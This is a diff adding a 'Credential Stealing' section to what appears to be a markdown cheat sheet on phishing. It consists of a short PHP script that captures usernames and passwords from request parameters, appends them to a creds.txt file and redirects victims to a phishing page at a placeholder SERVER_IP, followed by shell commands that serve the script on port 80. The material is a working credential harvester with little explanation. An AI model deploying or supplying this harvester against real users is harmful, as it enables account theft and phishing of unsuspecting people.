@@ -312,3 +312,23 @@ Tip: It would be wise to try running our HTML code locally to see how it looks a
 
 ```
 
+#### Credential Stealing
+
+```
+<?php
+if (isset($_GET['username']) && isset($_GET['password'])) {
+    $file = fopen("creds.txt", "a+");
+    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
+    header("Location: http://SERVER_IP/phishing/index.php");
+    fclose($file);
+    exit();
+}
+?>
+```
+
+```
+mkdir /tmp/tmpserver
+cd /tmp/tmpserver
+vi index.php #at this step we wrote our index.php file
+sudo php -S 0.0.0.0:80
+```
